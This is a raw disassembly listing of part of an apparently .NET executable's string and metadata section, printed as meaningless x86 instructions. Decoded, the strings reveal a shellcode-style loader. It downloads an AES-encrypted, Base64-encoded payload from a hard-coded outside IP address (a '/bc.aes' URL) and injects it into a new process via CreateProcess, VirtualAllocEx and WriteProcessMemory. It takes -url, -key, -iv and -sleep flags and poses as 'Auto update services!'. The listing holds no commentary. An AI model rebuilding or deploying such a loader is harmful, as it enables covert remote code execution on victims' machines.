  403104:	6d                   	insl   (%dx),%es:(%edi)
  403105:	2e 52                	cs push %edx
  403107:	75 6e                	jne    0x403177
  403109:	74 69                	je     0x403174
  40310b:	6d                   	insl   (%dx),%es:(%edi)
  40310c:	65 2e 56             	gs cs push %esi
  40310f:	65 72 73             	gs jb  0x403185
  403112:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  403119:	46                   	inc    %esi
  40311a:	72 6f                	jb     0x40318b
  40311c:	6d                   	insl   (%dx),%es:(%edi)
  40311d:	42                   	inc    %edx
  40311e:	61                   	popa
  40311f:	73 65                	jae    0x403186
  403121:	36 34 53             	ss xor $0x53,%al
  403124:	74 72                	je     0x403198
  403126:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  40312d:	73 74                	jae    0x4031a3
  40312f:	72 69                	jb     0x40319a
  403131:	6e                   	outsb  %ds:(%esi),(%dx)
  403132:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  403136:	6d                   	insl   (%dx),%es:(%edi)
  403137:	70 75                	jo     0x4031ae
  403139:	74 65                	je     0x4031a0
  40313b:	53                   	push   %ebx
  40313c:	74 72                	je     0x4031b0
  40313e:	69 6e 67 48 61 73 68 	imul   $0x68736148,0x67(%esi),%ebp
  403145:	00 67 65             	add    %ah,0x65(%edi)
  403148:	74 5f                	je     0x4031a9
  40314a:	4c                   	dec    %esp
  40314b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40314d:	67 74 68             	addr16 je 0x4031b8
  403150:	00 53 74             	add    %dl,0x74(%ebx)
  403153:	61                   	popa
  403154:	72 74                	jb     0x4031ca
  403156:	73 57                	jae    0x4031af
  403158:	69 74 68 00 54 72 61 	imul   $0x6e617254,0x0(%eax,%ebp,2),%esi
  40315f:	6e 
  403160:	73 66                	jae    0x4031c8
  403162:	6f                   	outsl  %ds:(%esi),(%dx)
  403163:	72 6d                	jb     0x4031d2
  403165:	46                   	inc    %esi
  403166:	69 6e 61 6c 42 6c 6f 	imul   $0x6f6c426c,0x61(%esi),%ebp
  40316d:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  403170:	4d                   	dec    %ebp
  403171:	61                   	popa
  403172:	72 73                	jb     0x4031e7
  403174:	68 61 6c 00 6b       	push   $0x6b006c61
  403179:	65 72 6e             	gs jb  0x4031ea
  40317c:	65 6c                	gs insb (%dx),%es:(%edi)
  40317e:	33 32                	xor    (%edx),%esi
  403180:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  403183:	6c                   	insb   (%dx),%es:(%edi)
  403184:	00 50 72             	add    %dl,0x72(%eax)
  403187:	6f                   	outsl  %ds:(%esi),(%dx)
  403188:	67 72 61             	addr16 jb 0x4031ec
  40318b:	6d                   	insl   (%dx),%es:(%edi)
  40318c:	00 53 79             	add    %dl,0x79(%ebx)
  40318f:	73 74                	jae    0x403205
  403191:	65 6d                	gs insl (%dx),%es:(%edi)
  403193:	00 53 79             	add    %dl,0x79(%ebx)
  403196:	6d                   	insl   (%dx),%es:(%edi)
  403197:	6d                   	insl   (%dx),%es:(%edi)
  403198:	65 74 72             	gs je  0x40320d
  40319b:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4031a2:	69 74 68 6d 00 54 72 	imul   $0x69725400,0x6d(%eax,%ebp,2),%esi
  4031a9:	69 
  4031aa:	6d                   	insl   (%dx),%es:(%edi)
  4031ab:	00 49 43             	add    %cl,0x43(%ecx)
  4031ae:	72 79                	jb     0x403229
  4031b0:	70 74                	jo     0x403226
  4031b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4031b3:	54                   	push   %esp
  4031b4:	72 61                	jb     0x403217
  4031b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4031b7:	73 66                	jae    0x40321f
  4031b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ba:	72 6d                	jb     0x403229
  4031bc:	00 6c 70 4e          	add    %ch,0x4e(%eax,%esi,2)
  4031c0:	75 6d                	jne    0x40322f
  4031c2:	62 65 72             	bound  %esp,0x72(%ebp)
  4031c5:	4f                   	dec    %edi
  4031c6:	66 42                	inc    %dx
  4031c8:	79 74                	jns    0x40323e
  4031ca:	65 73 57             	gs jae 0x403224
  4031cd:	72 69                	jb     0x403238
  4031cf:	74 74                	je     0x403245
  4031d1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4031d3:	00 4d 61             	add    %cl,0x61(%ebp)
  4031d6:	69 6e 00 6c 70 50 72 	imul   $0x7250706c,0x0(%esi),%ebp
  4031dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4031de:	63 65 73             	arpl   %esp,0x73(%ebp)
  4031e1:	73 49                	jae    0x40322c
  4031e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4031e4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4031e6:	72 6d                	jb     0x403255
  4031e8:	61                   	popa
  4031e9:	74 69                	je     0x403254
  4031eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4031ed:	00 53 79             	add    %dl,0x79(%ebx)
  4031f0:	73 74                	jae    0x403266
  4031f2:	65 6d                	gs insl (%dx),%es:(%edi)
  4031f4:	2e 52                	cs push %edx
  4031f6:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4031f9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4031fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4031ff:	00 41 72             	add    %al,0x72(%ecx)
  403202:	67 75 6d             	addr16 jne 0x403272
  403205:	65 6e                	outsb  %gs:(%esi),(%dx)
  403207:	74 45                	je     0x40324e
  403209:	78 63                	js     0x40326e
  40320b:	65 70 74             	gs jo  0x403282
  40320e:	69 6f 6e 00 53 74 72 	imul   $0x72745300,0x6e(%edi),%ebp
  403215:	69 6e 67 43 6f 6d 70 	imul   $0x706d6f43,0x67(%esi),%ebp
  40321c:	61                   	popa
  40321d:	72 69                	jb     0x403288
  40321f:	73 6f                	jae    0x403290
  403221:	6e                   	outsb  %ds:(%esi),(%dx)
  403222:	00 6c 70 53          	add    %ch,0x53(%eax,%esi,2)
  403226:	74 61                	je     0x403289
  403228:	72 74                	jb     0x40329e
  40322a:	75 70                	jne    0x40329c
  40322c:	49                   	dec    %ecx
  40322d:	6e                   	outsb  %ds:(%esi),(%dx)
  40322e:	66 6f                	outsw  %ds:(%esi),(%dx)
  403230:	00 5a 65             	add    %bl,0x65(%edx)
  403233:	72 6f                	jb     0x4032a4
  403235:	00 48 65             	add    %cl,0x65(%eax)
  403238:	6c                   	insb   (%dx),%es:(%edi)
  403239:	70 00                	jo     0x40323b
  40323b:	6c                   	insb   (%dx),%es:(%edi)
  40323c:	70 44                	jo     0x403282
  40323e:	65 73 6b             	gs jae 0x4032ac
  403241:	74 6f                	je     0x4032b2
  403243:	70 00                	jo     0x403245
  403245:	53                   	push   %ebx
  403246:	79 73                	jns    0x4032bb
  403248:	74 65                	je     0x4032af
  40324a:	6d                   	insl   (%dx),%es:(%edi)
  40324b:	2e 4e                	cs dec %esi
  40324d:	65 74 2e             	gs je  0x40327e
  403250:	48                   	dec    %eax
  403251:	74 74                	je     0x4032c7
  403253:	70 00                	jo     0x403255
  403255:	6c                   	insb   (%dx),%es:(%edi)
  403256:	70 42                	jo     0x40329a
  403258:	75 66                	jne    0x4032c0
  40325a:	66 65 72 00          	data16 gs jb 0x40325e
  40325e:	41                   	inc    %ecx
  40325f:	44                   	inc    %esp
  403260:	53                   	push   %ebx
  403261:	53                   	push   %ebx
  403262:	53                   	push   %ebx
  403263:	65 72 76             	gs jb  0x4032dc
  403266:	69 63 65 4d 61 6e 61 	imul   $0x616e614d,0x65(%ebx),%esp
  40326d:	67 65 72 00          	addr16 gs jb 0x403271
  403271:	63 69 70             	arpl   %ebp,0x70(%ecx)
  403274:	68 65 72 00 68       	push   $0x68007265
  403279:	53                   	push   %ebx
  40327a:	74 64                	je     0x4032e0
  40327c:	45                   	inc    %ebp
  40327d:	72 72                	jb     0x4032f1
  40327f:	6f                   	outsl  %ds:(%esi),(%dx)
  403280:	72 00                	jb     0x403282
  403282:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  403287:	00 43 72             	add    %al,0x72(%ebx)
  40328a:	65 61                	gs popa
  40328c:	74 65                	je     0x4032f3
  40328e:	44                   	inc    %esp
  40328f:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  403293:	70 74                	jo     0x403309
  403295:	6f                   	outsl  %ds:(%esi),(%dx)
  403296:	72 00                	jb     0x403298
  403298:	49                   	dec    %ecx
  403299:	6e                   	outsb  %ds:(%esi),(%dx)
  40329a:	74 50                	je     0x4032ec
  40329c:	74 72                	je     0x403310
  40329e:	00 53 79             	add    %dl,0x79(%ebx)
  4032a1:	73 74                	jae    0x403317
  4032a3:	65 6d                	gs insl (%dx),%es:(%edi)
  4032a5:	2e 44                	cs inc %esp
  4032a7:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4032ae:	69 63 73 00 41 65 73 	imul   $0x73654100,0x73(%ebx),%esp
  4032b5:	00 53 79             	add    %dl,0x79(%ebx)
  4032b8:	73 74                	jae    0x40332e
  4032ba:	65 6d                	gs insl (%dx),%es:(%edi)
  4032bc:	2e 52                	cs push %edx
  4032be:	75 6e                	jne    0x40332e
  4032c0:	74 69                	je     0x40332b
  4032c2:	6d                   	insl   (%dx),%es:(%edi)
  4032c3:	65 2e 49             	gs cs dec %ecx
  4032c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4032c7:	74 65                	je     0x40332e
  4032c9:	72 6f                	jb     0x40333a
  4032cb:	70 53                	jo     0x403320
  4032cd:	65 72 76             	gs jb  0x403346
  4032d0:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4032d7:	73 74                	jae    0x40334d
  4032d9:	65 6d                	gs insl (%dx),%es:(%edi)
  4032db:	2e 52                	cs push %edx
  4032dd:	75 6e                	jne    0x40334d
  4032df:	74 69                	je     0x40334a
  4032e1:	6d                   	insl   (%dx),%es:(%edi)
  4032e2:	65 2e 43             	gs cs inc %ebx
  4032e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032e6:	6d                   	insl   (%dx),%es:(%edi)
  4032e7:	70 69                	jo     0x403352
  4032e9:	6c                   	insb   (%dx),%es:(%edi)
  4032ea:	65 72 53             	gs jb  0x403340
  4032ed:	65 72 76             	gs jb  0x403366
  4032f0:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4032f7:	62 75 67             	bound  %esi,0x67(%ebp)
  4032fa:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  403301:	65 
  403302:	73 00                	jae    0x403304
  403304:	62 49 6e             	bound  %ecx,0x6e(%ecx)
  403307:	68 65 72 69 74       	push   $0x74697265
  40330c:	48                   	dec    %eax
  40330d:	61                   	popa
  40330e:	6e                   	outsb  %ds:(%esi),(%dx)
  40330f:	64 6c                	fs insb (%dx),%es:(%edi)
  403311:	65 73 00             	gs jae 0x403314
  403314:	6c                   	insb   (%dx),%es:(%edi)
  403315:	70 54                	jo     0x40336b
  403317:	68 72 65 61 64       	push   $0x64616572
  40331c:	41                   	inc    %ecx
  40331d:	74 74                	je     0x403393
  40331f:	72 69                	jb     0x40338a
  403321:	62 75 74             	bound  %esi,0x74(%ebp)
  403324:	65 73 00             	gs jae 0x403327
  403327:	6c                   	insb   (%dx),%es:(%edi)
  403328:	70 50                	jo     0x40337a
  40332a:	72 6f                	jb     0x40339b
  40332c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40332f:	73 41                	jae    0x403372
  403331:	74 74                	je     0x4033a7
  403333:	72 69                	jb     0x40339e
  403335:	62 75 74             	bound  %esi,0x74(%ebp)
  403338:	65 73 00             	gs jae 0x40333b
  40333b:	52                   	push   %edx
  40333c:	65 61                	gs popa
  40333e:	64 41                	fs inc %ecx
  403340:	6c                   	insb   (%dx),%es:(%edi)
  403341:	6c                   	insb   (%dx),%es:(%edi)
  403342:	42                   	inc    %edx
  403343:	79 74                	jns    0x4033b9
  403345:	65 73 00             	gs jae 0x403348
  403348:	48                   	dec    %eax
  403349:	65 78 53             	gs js  0x40339f
  40334c:	74 72                	je     0x4033c0
  40334e:	69 6e 67 54 6f 42 79 	imul   $0x79426f54,0x67(%esi),%ebp
  403355:	74 65                	je     0x4033bc
  403357:	73 00                	jae    0x403359
  403359:	64 77 43             	fs ja  0x40339f
  40335c:	72 65                	jb     0x4033c3
  40335e:	61                   	popa
  40335f:	74 69                	je     0x4033ca
  403361:	6f                   	outsl  %ds:(%esi),(%dx)
  403362:	6e                   	outsb  %ds:(%esi),(%dx)
  403363:	46                   	inc    %esi
  403364:	6c                   	insb   (%dx),%es:(%edi)
  403365:	61                   	popa
  403366:	67 73 00             	addr16 jae 0x403369
  403369:	64 77 46             	fs ja  0x4033b2
  40336c:	6c                   	insb   (%dx),%es:(%edi)
  40336d:	61                   	popa
  40336e:	67 73 00             	addr16 jae 0x403371
  403371:	61                   	popa
  403372:	72 67                	jb     0x4033db
  403374:	73 00                	jae    0x403376
  403376:	53                   	push   %ebx
  403377:	79 73                	jns    0x4033ec
  403379:	74 65                	je     0x4033e0
  40337b:	6d                   	insl   (%dx),%es:(%edi)
  40337c:	2e 54                	cs push %esp
  40337e:	68 72 65 61 64       	push   $0x64616572
  403383:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  40338a:	6b 73 00 67          	imul   $0x67,0x0(%ebx),%esi
  40338e:	65 74 5f             	gs je  0x4033f0
  403391:	43                   	inc    %ebx
  403392:	68 61 72 73 00       	push   $0x737261
  403397:	64 77 58             	fs ja  0x4033f2
  40339a:	43                   	inc    %ebx
  40339b:	6f                   	outsl  %ds:(%esi),(%dx)
  40339c:	75 6e                	jne    0x40340c
  40339e:	74 43                	je     0x4033e3
  4033a0:	68 61 72 73 00       	push   $0x737261
  4033a5:	64 77 59             	fs ja  0x403401
  4033a8:	43                   	inc    %ebx
  4033a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4033aa:	75 6e                	jne    0x40341a
  4033ac:	74 43                	je     0x4033f1
  4033ae:	68 61 72 73 00       	push   $0x737261
  4033b3:	43                   	inc    %ebx
  4033b4:	72 65                	jb     0x40341b
  4033b6:	61                   	popa
  4033b7:	74 65                	je     0x40341e
  4033b9:	50                   	push   %eax
  4033ba:	72 6f                	jb     0x40342b
  4033bc:	63 65 73             	arpl   %esp,0x73(%ebp)
  4033bf:	73 00                	jae    0x4033c1
  4033c1:	68 50 72 6f 63       	push   $0x636f7250
  4033c6:	65 73 73             	gs jae 0x40343c
  4033c9:	00 6c 70 42          	add    %ch,0x42(%eax,%esi,2)
  4033cd:	61                   	popa
  4033ce:	73 65                	jae    0x403435
  4033d0:	41                   	inc    %ecx
  4033d1:	64 64 72 65          	fs fs jb 0x40343a
  4033d5:	73 73                	jae    0x40344a
  4033d7:	00 6c 70 41          	add    %ch,0x41(%eax,%esi,2)
  4033db:	64 64 72 65          	fs fs jb 0x403444
  4033df:	73 73                	jae    0x403454
  4033e1:	00 43 6f             	add    %al,0x6f(%ebx)
  4033e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4033e5:	63 61 74             	arpl   %esp,0x74(%ecx)
  4033e8:	00 46 6f             	add    %al,0x6f(%esi)
  4033eb:	72 6d                	jb     0x40345a
  4033ed:	61                   	popa
  4033ee:	74 00                	je     0x4033f0
  4033f0:	68 4f 62 6a 65       	push   $0x656a624f
  4033f5:	63 74 00 66          	arpl   %esi,0x66(%eax,%eax,1)
  4033f9:	6c                   	insb   (%dx),%es:(%edi)
  4033fa:	50                   	push   %eax
  4033fb:	72 6f                	jb     0x40346c
  4033fd:	74 65                	je     0x403464
  4033ff:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  403403:	65 74 5f             	gs je  0x403465
  403406:	52                   	push   %edx
  403407:	65 73 75             	gs jae 0x40347f
  40340a:	6c                   	insb   (%dx),%es:(%edi)
  40340b:	74 00                	je     0x40340d
  40340d:	48                   	dec    %eax
  40340e:	74 74                	je     0x403484
  403410:	70 43                	jo     0x403455
  403412:	6c                   	insb   (%dx),%es:(%edi)
  403413:	69 65 6e 74 00 6c 70 	imul   $0x706c0074,0x6e(%ebp),%esp
  40341a:	45                   	inc    %ebp
  40341b:	6e                   	outsb  %ds:(%esi),(%dx)
  40341c:	76 69                	jbe    0x403487
  40341e:	72 6f                	jb     0x40348f
  403420:	6e                   	outsb  %ds:(%esi),(%dx)
  403421:	6d                   	insl   (%dx),%es:(%edi)
  403422:	65 6e                	outsb  %gs:(%esi),(%dx)
  403424:	74 00                	je     0x403426
  403426:	41                   	inc    %ecx
  403427:	45                   	inc    %ebp
  403428:	53                   	push   %ebx
  403429:	5f                   	pop    %edi
  40342a:	44                   	inc    %esp
  40342b:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40342f:	70 74                	jo     0x4034a5
  403431:	00 43 6f             	add    %al,0x6f(%ebx)
  403434:	6e                   	outsb  %ds:(%esi),(%dx)
  403435:	76 65                	jbe    0x40349c
  403437:	72 74                	jb     0x4034ad
  403439:	00 68 53             	add    %ch,0x53(%eax)
  40343c:	74 64                	je     0x4034a2
  40343e:	49                   	dec    %ecx
  40343f:	6e                   	outsb  %ds:(%esi),(%dx)
  403440:	70 75                	jo     0x4034b7
  403442:	74 00                	je     0x403444
  403444:	68 53 74 64 4f       	push   $0x4f647453
  403449:	75 74                	jne    0x4034bf
  40344b:	70 75                	jo     0x4034c2
  40344d:	74 00                	je     0x40344f
  40344f:	52                   	push   %edx
  403450:	65 61                	gs popa
  403452:	64 41                	fs inc %ecx
  403454:	6c                   	insb   (%dx),%es:(%edi)
  403455:	6c                   	insb   (%dx),%es:(%edi)
  403456:	54                   	push   %esp
  403457:	65 78 74             	gs js  0x4034ce
  40345a:	00 69 76             	add    %ch,0x76(%ecx)
  40345d:	00 77 53             	add    %dh,0x53(%edi)
  403460:	68 6f 77 57 69       	push   $0x6957776f
  403465:	6e                   	outsb  %ds:(%esi),(%dx)
  403466:	64 6f                	outsl  %fs:(%esi),(%dx)
  403468:	77 00                	ja     0x40346a
  40346a:	56                   	push   %esi
  40346b:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
  403472:	6c                   	insb   (%dx),%es:(%edi)
  403473:	6c                   	insb   (%dx),%es:(%edi)
  403474:	6f                   	outsl  %ds:(%esi),(%dx)
  403475:	63 45 78             	arpl   %eax,0x78(%ebp)
  403478:	00 68 65             	add    %ch,0x65(%eax)
  40347b:	78 00                	js     0x40347d
  40347d:	73 65                	jae    0x4034e4
  40347f:	74 5f                	je     0x4034e0
  403481:	4b                   	dec    %ebx
  403482:	65 79 00             	gs jns 0x403485
  403485:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  403489:	53                   	push   %ebx
  40348a:	79 73                	jns    0x4034ff
  40348c:	74 65                	je     0x4034f3
  40348e:	6d                   	insl   (%dx),%es:(%edi)
  40348f:	2e 53                	cs push %ebx
  403491:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  403495:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40349c:	70 
  40349d:	74 6f                	je     0x40350e
  40349f:	67 72 61             	addr16 jb 0x403503
  4034a2:	70 68                	jo     0x40350c
  4034a4:	79 00                	jns    0x4034a6
  4034a6:	57                   	push   %edi
  4034a7:	72 69                	jb     0x403512
  4034a9:	74 65                	je     0x403510
  4034ab:	50                   	push   %eax
  4034ac:	72 6f                	jb     0x40351d
  4034ae:	63 65 73             	arpl   %esp,0x73(%ebp)
  4034b1:	73 4d                	jae    0x403500
  4034b3:	65 6d                	gs insl (%dx),%es:(%edi)
  4034b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b6:	72 79                	jb     0x403531
  4034b8:	00 6c 70 43          	add    %ch,0x43(%eax,%esi,2)
  4034bc:	75 72                	jne    0x403530
  4034be:	72 65                	jb     0x403525
  4034c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4034c1:	74 44                	je     0x403507
  4034c3:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4034ca:	79 00                	jns    0x4034cc
  4034cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4034cd:	70 5f                	jo     0x40352e
  4034cf:	45                   	inc    %ebp
  4034d0:	71 75                	jno    0x403547
  4034d2:	61                   	popa
  4034d3:	6c                   	insb   (%dx),%es:(%edi)
  4034d4:	69 74 79 00 49 73 4e 	imul   $0x754e7349,0x0(%ecx,%edi,2),%esi
  4034db:	75 
  4034dc:	6c                   	insb   (%dx),%es:(%edi)
  4034dd:	6c                   	insb   (%dx),%es:(%edi)
  4034de:	4f                   	dec    %edi
  4034df:	72 45                	jb     0x403526
  4034e1:	6d                   	insl   (%dx),%es:(%edi)
  4034e2:	70 74                	jo     0x403558
  4034e4:	79 00                	jns    0x4034e6
  4034e6:	00 00                	add    %al,(%eax)
  4034e8:	00 2b                	add    %ch,(%ebx)
  4034ea:	41                   	inc    %ecx
  4034eb:	00 75 00             	add    %dh,0x0(%ebp)
  4034ee:	74 00                	je     0x4034f0
  4034f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4034f1:	00 20                	add    %ah,(%eax)
  4034f3:	00 75 00             	add    %dh,0x0(%ebp)
  4034f6:	70 00                	jo     0x4034f8
  4034f8:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4034fc:	74 00                	je     0x4034fe
  4034fe:	65 00 20             	add    %ah,%gs:(%eax)
  403501:	00 73 00             	add    %dh,0x0(%ebx)
  403504:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403508:	76 00                	jbe    0x40350a
  40350a:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  403510:	73 00                	jae    0x403512
  403512:	21 00                	and    %eax,(%eax)
  403514:	00 05 30 00 78 00    	add    %al,0x780030
  40351a:	00 33                	add    %dh,(%ebx)
  40351c:	49                   	dec    %ecx
  40351d:	00 6e 00             	add    %ch,0x0(%esi)
  403520:	76 00                	jbe    0x403522
  403522:	61                   	popa
  403523:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  403527:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40352b:	00 68 00             	add    %ch,0x0(%eax)
  40352e:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  403532:	20 00                	and    %al,(%eax)
  403534:	73 00                	jae    0x403536
  403536:	74 00                	je     0x403538
  403538:	72 00                	jb     0x40353a
  40353a:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  403540:	20 00                	and    %al,(%eax)
  403542:	6c                   	insb   (%dx),%es:(%edi)
  403543:	00 65 00             	add    %ah,0x0(%ebp)
  403546:	6e                   	outsb  %ds:(%esi),(%dx)
  403547:	00 67 00             	add    %ah,0x0(%edi)
  40354a:	74 00                	je     0x40354c
  40354c:	68 00 00 39 68       	push   $0x68390000
  403551:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  403555:	00 70 00             	add    %dh,0x0(%eax)
  403558:	3a 00                	cmp    (%eax),%al
  40355a:	2f                   	das
  40355b:	00 2f                	add    %ch,(%edi)
  40355d:	00 32                	add    %dh,(%edx)
  40355f:	00 32                	add    %dh,(%edx)
  403561:	00 31                	add    %dh,(%ecx)
  403563:	00 2e                	add    %ch,(%esi)
  403565:	00 31                	add    %dh,(%ecx)
  403567:	00 33                	add    %dh,(%ebx)
  403569:	00 32                	add    %dh,(%edx)
  40356b:	00 2e                	add    %ch,(%esi)
  40356d:	00 32                	add    %dh,(%edx)
  40356f:	00 39                	add    %bh,(%ecx)
  403571:	00 2e                	add    %ch,(%esi)
  403573:	00 31                	add    %dh,(%ecx)
  403575:	00 33                	add    %dh,(%ebx)
  403577:	00 37                	add    %dh,(%edi)
  403579:	00 2f                	add    %ch,(%edi)
  40357b:	00 62 00             	add    %ah,0x0(%edx)
  40357e:	63 00                	arpl   %eax,(%eax)
  403580:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  403584:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403588:	00 07                	add    %al,(%edi)
  40358a:	2d 00 69 00 6e       	sub    $0x6e006900,%eax
  40358f:	00 01                	add    %al,(%ecx)
  403591:	09 2d 00 75 00 72    	or     %ebp,0x72007500
  403597:	00 6c 00 01          	add    %ch,0x1(%eax,%eax,1)
  40359b:	09 2d 00 62 00 36    	or     %ebp,0x36006200
  4035a1:	00 34 00             	add    %dh,(%eax,%eax,1)
  4035a4:	01 09                	add    %ecx,(%ecx)
  4035a6:	2d 00 6b 00 65       	sub    $0x65006b00,%eax
  4035ab:	00 79 00             	add    %bh,0x0(%ecx)
  4035ae:	01 07                	add    %eax,(%edi)
  4035b0:	2d 00 69 00 76       	sub    $0x76006900,%eax
  4035b5:	00 01                	add    %al,(%ecx)
  4035b7:	0d 2d 00 73 00       	or     $0x73002d,%eax
  4035bc:	6c                   	insb   (%dx),%es:(%edi)
  4035bd:	00 65 00             	add    %ah,0x0(%ebp)
  4035c0:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  4035c4:	01 05 2d 00 68 00    	add    %eax,0x68002d
  4035ca:	01 0b                	add    %ecx,(%ebx)
  4035cc:	2d 00 68 00 65       	sub    $0x65006800,%eax
  4035d1:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  4035d5:	00 01                	add    %al,(%ecx)
  4035d7:	1f                   	pop    %ds
  4035d8:	55                   	push   %ebp
  4035d9:	00 6e 00             	add    %ch,0x0(%esi)
  4035dc:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  4035df:	00 6f 00             	add    %ch,0x0(%edi)
  4035e2:	77 00                	ja     0x4035e4
  4035e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4035e5:	00 20                	add    %ah,(%eax)
  4035e7:	00 70 00             	add    %dh,0x0(%eax)
  4035ea:	61                   	popa
  4035eb:	00 72 00             	add    %dh,0x0(%edx)
  4035ee:	61                   	popa
  4035ef:	00 6d 00             	add    %ch,0x0(%ebp)
  4035f2:	3a 00                	cmp    (%eax),%al
  4035f4:	20 00                	and    %al,(%eax)
  4035f6:	00 29                	add    %ch,(%ecx)
  4035f8:	4d                   	dec    %ebp
  4035f9:	00 69 00             	add    %ch,0x0(%ecx)
  4035fc:	73 00                	jae    0x4035fe
  4035fe:	73 00                	jae    0x403600
  403600:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  403606:	20 00                	and    %al,(%eax)
  403608:	69 00 6e 00 70 00    	imul   $0x70006e,(%eax),%eax
  40360e:	75 00                	jne    0x403610
  403610:	74 00                	je     0x403612
  403612:	20 00                	and    %al,(%eax)
  403614:	6f                   	outsl  %ds:(%esi),(%dx)
  403615:	00 72 00             	add    %dh,0x0(%edx)
  403618:	20 00                	and    %al,(%eax)
  40361a:	6b 00 65             	imul   $0x65,(%eax),%eax
  40361d:	00 79 00             	add    %bh,0x0(%ecx)
  403620:	00 35 46 00 61 00    	add    %dh,0x610046
  403626:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40362c:	64 00 20             	add    %ah,%fs:(%eax)
  40362f:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  403633:	00 20                	add    %ah,(%eax)
  403635:	00 67 00             	add    %ah,0x0(%edi)
  403638:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  40363d:	00 69 00             	add    %ch,0x0(%ecx)
  403640:	6e                   	outsb  %ds:(%esi),(%dx)
  403641:	00 70 00             	add    %dh,0x0(%eax)
  403644:	75 00                	jne    0x403646
  403646:	74 00                	je     0x403648
  403648:	20 00                	and    %al,(%eax)
  40364a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40364e:	74 00                	je     0x403650
  403650:	61                   	popa
  403651:	00 3a                	add    %bh,(%edx)
  403653:	00 20                	add    %ah,(%eax)
  403655:	00 00                	add    %al,(%eax)
  403657:	29 4b 00             	sub    %ecx,0x0(%ebx)
  40365a:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40365e:	2f                   	das
  40365f:	00 49 00             	add    %cl,0x0(%ecx)
  403662:	56                   	push   %esi
  403663:	00 20                	add    %ah,(%eax)
  403665:	00 69 00             	add    %ch,0x0(%ecx)
  403668:	6e                   	outsb  %ds:(%esi),(%dx)
  403669:	00 76 00             	add    %dh,0x0(%esi)
  40366c:	61                   	popa
  40366d:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  403671:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  403675:	00 68 00             	add    %ch,0x0(%eax)
  403678:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40367c:	3a 00                	cmp    (%eax),%al
  40367e:	20 00                	and    %al,(%eax)
  403680:	00 80 81 4b 00 65    	add    %al,0x65004b81(%eax)
  403686:	00 79 00             	add    %bh,0x0(%ecx)
  403689:	20 00                	and    %al,(%eax)
  40368b:	6c                   	insb   (%dx),%es:(%edi)
  40368c:	00 65 00             	add    %ah,0x0(%ebp)
  40368f:	6e                   	outsb  %ds:(%esi),(%dx)
  403690:	00 67 00             	add    %ah,0x0(%edi)
  403693:	74 00                	je     0x403695
  403695:	68 00 20 00 69       	push   $0x69002000
  40369a:	00 6e 00             	add    %ch,0x0(%esi)
  40369d:	76 00                	jbe    0x40369f
  40369f:	61                   	popa
  4036a0:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
